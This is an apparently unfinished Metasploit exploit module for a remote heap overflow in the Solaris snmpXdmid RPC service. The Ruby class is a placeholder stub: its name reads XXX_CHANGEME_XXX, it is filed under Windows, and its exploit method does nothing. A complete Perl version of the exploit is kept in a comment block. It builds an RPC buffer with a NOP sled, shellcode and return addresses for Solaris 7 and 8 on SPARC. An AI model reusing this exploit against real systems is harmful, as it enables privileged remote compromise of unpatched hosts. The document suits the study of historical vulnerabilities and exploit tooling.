require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris snmpXdmid AddComponent Overflow',
			'Description'    => %q{
				Exploit based on LSD's solsparc_snmpxdmid.c. Exploit a
				simple overflow and return to the heap avoiding NX stacks.
					
			},
			'Author'         => [ 'vlad902 <vlad902@gmail.com>' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 3637 $',
			'References'     =>
				[
					[ 'BID', '2417'],
					[ 'URL', 'http://lsd-pl.net/code/SOLARIS/solsparc_snmpxdmid.c'],
					[ 'MIL', '65'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 64000,
					'BadChars' => "",
					'MinNops'  => 63000,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Mar 15 2001',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_snmpxdmid;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::SunRPC;
use Pex::XDR;

my $advanced = { };
my $info =
{
	'Name'    => 'Solaris snmpXdmid AddComponent Overflow',
	'Version' => '$Revision: 3637 $',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],

	'Arch'  => [ 'sparc' ],
	'OS'    => [ 'solaris' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target RPC port', 111],
	  },

	'Payload' =>
	  {
		'Space' => 64000,
		'MinNops' => 63000,
	  },

	'Description'  => Pex::Text::Freeform(qq{
	Exploit based on LSD's solsparc_snmpxdmid.c. Exploit a simple overflow and
	return to the heap avoiding NX stacks.
}),

	'Refs'  =>
	  [
		['BID', '2417'],
		['URL', 'http://lsd-pl.net/code/SOLARIS/solsparc_snmpxdmid.c'],
		['MIL', '65'],
	  ],

	'Targets' =>
	  [
		[ 'Solaris 7 / SPARC', 0xb1868 + 96000, 0xb1868 + 32000 ],
		[ 'Solaris 8 / SPARC', 0xcf2c0 + 96000, 0xcf2c0 + 32000 ],
	  ],

	'Keys'  => ['snmpxdmid'],

	'DisclosureDate' => 'Mar 15 2001',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;

	my $target_idx = $self->GetVar('TARGET');
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my %data;

	my $host = $self->GetVar('RHOST');
	my $port = $self->GetVar('RPORT');

	if(Pex::SunRPC::Clnt_create(\%data, $host, $port, 100249, 1, "tcp", "tcp") == -1)
	{
		$self->PrintLine("[*] RPC request failed (snmpXdmid).");
		return;
	}

	$self->PrintLine("[*] Using port $data{'rport'}");
	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);
	$self->PrintLine("[*] Generating buffer...");

	my $array1 =
	  (pack("N", ($target->[2])) x (1248/4)).
	  (pack("N", ($target->[1])) x (352/4)).
	  (pack("N", 0));

	my $array2 =
	  (pack("N", 0) x (64000/4)).
	  ($shellcode).
	  (pack("N", 0));

	my @array1_tbl = map { unpack("C", $_) } split(//, $array1);
	my @array2_tbl = map { unpack("C", $_) } split(//, $array2);

	my $buf =
	  Pex::XDR::Encode_int(0).
	  Pex::XDR::Encode_int(0).
	  Pex::XDR::Encode_bool(1).
	  Pex::XDR::Encode_int(0).
	  Pex::XDR::Encode_bool(1).
	  Pex::XDR::Encode_varray([@array1_tbl], \&Pex::XDR::Encode_lchar).
	  Pex::XDR::Encode_bool(1).
	  Pex::XDR::Encode_varray([@array2_tbl], \&Pex::XDR::Encode_lchar).
	  Pex::XDR::Encode_int(0).
	  Pex::XDR::Encode_int(0);

	$self->PrintLine("[*] Sending payload...");

	if(Pex::SunRPC::Clnt_call(\%data, 0x101, $buf) == -1)
	{
		$self->PrintLine("[*] snmpXdmid addcomponent request failed.");
		return;
	}

	$self->PrintLine("[*] Sent!");

	return;
}

=end


end
end	
